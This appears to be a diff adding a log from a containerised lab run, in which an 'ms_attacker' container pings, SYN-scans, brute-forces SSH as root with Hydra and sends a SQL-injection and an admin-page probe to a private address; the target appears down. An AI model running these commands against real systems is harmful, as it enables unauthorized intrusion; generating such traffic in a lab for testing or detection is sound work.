@@ -1,0 +1,17 @@
+[2026-04-27T02:53:15Z] attacks capture start
+$ docker exec ms_attacker ping -c 3 10.201.0.20; docker exec ms_attacker nmap -sS -p 80 --max-retries 1 10.201.0.20 || true; docker exec ms_attacker hydra -l root -P /tmp/wordlist.txt -t 2 -f ssh://10.201.0.20 || true; docker exec ms_attacker curl -m 5 -sS 'http://10.201.0.20/?id=1+UNION+SELECT+1,2' || true; docker exec ms_attacker curl -m 5 -sS 'http://10.201.0.20/admin' || true
+PING 10.201.0.20 (10.201.0.20) 56(84) bytes of data.
+
+--- 10.201.0.20 ping statistics ---
+3 packets transmitted, 0 received, 100% packet loss, time 2087ms
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-27 02:53 UTC
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 3.09 seconds
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-27 02:53:30
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 1000 login tries (l:1/p:1000), ~500 tries per task
+[DATA] attacking ssh://10.201.0.20:22/
+exit_code=0
+[2026-04-27T02:53:40Z] attacks capture end
